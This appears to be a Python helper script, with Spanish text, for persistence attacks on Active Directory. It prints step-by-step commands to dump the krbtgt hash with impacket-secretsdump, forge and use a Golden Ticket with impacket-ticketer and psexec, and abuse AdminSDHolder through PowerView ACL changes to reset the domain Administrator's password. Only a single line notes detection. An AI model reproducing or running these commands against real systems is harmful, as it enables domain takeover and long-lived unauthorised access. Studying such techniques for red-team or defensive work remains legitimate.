#!/usr/bin/env python3
"""
persistence.py — Mecanismos de persistencia en Active Directory
MITRE ATT&CK: T1558.001 (Golden Ticket) · T1098 (AdminSDHolder)

Uso:
    # Ver instrucciones de Golden Ticket
    python3 persistence.py golden --domain empresa.local --help-only

    # Verificar si ya tienes un Golden Ticket activo
    python3 persistence.py check-ticket

    # Generar comandos de AdminSDHolder abuse
    python3 persistence.py adminsdholder --domain empresa.local --user juan.garcia
"""

import argparse
import subprocess
import os


class C:
    RED="\033[91m";GREEN="\033[92m";YELLOW="\033[93m"
    BLUE="\033[94m";CYAN="\033[96m";BOLD="\033[1m";RESET="\033[0m"

def ok(m):   print(C.GREEN+  "  [+] "+C.RESET+m)
def info(m): print(C.BLUE+   "  [*] "+C.RESET+m)
def warn(m): print(C.YELLOW+ "  [!] "+C.RESET+m)


def banner():
    print(C.CYAN+C.BOLD+"""
  ╔══════════════════════════════════════════════════╗
  ║   PERSISTENCE — Golden Ticket · AdminSDHolder    ║
  ╚══════════════════════════════════════════════════╝
"""+C.RESET)


def cmd_check_ticket(args):
    """Verifica si hay un Golden Ticket cargado en la sesion actual."""
    info("Verificando tickets Kerberos activos...")
    ccache = os.environ.get("KRB5CCNAME", "")
    if ccache:
        ok("Variable KRB5CCNAME configurada: " + ccache)
        subprocess.run(["klist"], capture_output=False)
    else:
        warn("No hay ticket cargado en KRB5CCNAME")
        info("Para cargar un ticket: export KRB5CCNAME=golden_ticket.ccache")


def cmd_golden_info(args):
    """Muestra informacion completa sobre Golden Tickets."""
    print(C.BOLD + "\n  ══ GOLDEN TICKET — Guia completa ══\n" + C.RESET)
    print("""
  REQUISITOS:
    - Hash NTLM de la cuenta krbtgt
    - SID del dominio
    - (Opcionales) RID del usuario objetivo

  OBTENER EL HASH DE KRBTGT:
    impacket-secretsdump """ + args.domain + """/Administrador:'Admin123!'@DC_IP \\
        -just-dc-user krbtgt

  OBTENER EL SID DEL DOMINIO:
    impacket-getPac """ + args.domain + """/usuario:'pass'@DC_IP

  CREAR EL GOLDEN TICKET:
    impacket-ticketer \\
        -nthash <HASH_KRBTGT> \\
        -domain-sid S-1-5-21-XXXX-XXXX-XXXX \\
        -domain """ + args.domain + """ \\
        -user "FalseAdmin" \\
        -groups 512,513,518,519,520 \\
        golden_ticket

  USAR EL GOLDEN TICKET:
    export KRB5CCNAME=golden_ticket.ccache
    impacket-psexec -k -no-pass """ + args.domain + """/FalseAdmin@DC01.""" + args.domain + """

  VALIDEZ:
    - Dura 10 ANOS por defecto
    - Sobrevive cambios de contrasena del DA
    - Solo se invalida cambiando krbtgt DOS VECES con 10h de diferencia
""")


def cmd_adminsdholder(args):
    """Genera los comandos para AdminSDHolder abuse."""
    print(C.BOLD + "\n  ══ ADMINSDHOLDER ABUSE ══\n" + C.RESET)
    user = args.user
    domain = args.domain
    base = "DC=" + domain.replace(".", ",DC=")

    print("  AdminSDHolder protege a los miembros de grupos privilegiados.")
    print("  Si damos permisos sobre AdminSDHolder, se propagan a todos los DAs")
    print("  automaticamente cada ~60 minutos (proceso SDProp).\n")

    print(C.YELLOW + "  DESDE WINDOWS (PowerView):" + C.RESET)
    print("""
  # Dar GenericAll sobre AdminSDHolder al usuario controlado
  Add-ObjectACL \\
      -TargetIdentity "CN=AdminSDHolder,CN=System,""" + base + """" \\
      -PrincipalIdentity """ + user + """ \\
      -Rights All

  # Esperar ~60 minutos y luego:
  # Ahora """ + user + """ puede cambiar la contrasena de cualquier DA
  Set-ADAccountPassword -Identity Administrador \\
      -NewPassword (ConvertTo-SecureString "NuevaPass123!" -AsPlainText -Force)
""")

    print(C.YELLOW + "  DETECCION:" + C.RESET)
    print("  Event ID 5136 — modificacion de atributo en AdminSDHolder")
    print("  Monitorizar cambios en CN=AdminSDHolder,CN=System")


def parse_args():
    p = argparse.ArgumentParser(description="persistence.py — Persistencia en AD")
    sub = p.add_subparsers(dest="command", required=True)

    sub.add_parser("check-ticket", help="Verificar ticket Kerberos activo")

    gt = sub.add_parser("golden", help="Informacion sobre Golden Ticket")
    gt.add_argument("--domain", required=True)

    ash = sub.add_parser("adminsdholder", help="AdminSDHolder abuse")
    ash.add_argument("--domain", required=True)
    ash.add_argument("--user",   required=True, help="Usuario que recibirá los permisos")

    return p.parse_args()


def main():
    banner()
    args = parse_args()
    if args.command == "check-ticket":  cmd_check_ticket(args)
    elif args.command == "golden":      cmd_golden_info(args)
    elif args.command == "adminsdholder": cmd_adminsdholder(args)

if __name__ == "__main__":
    main()
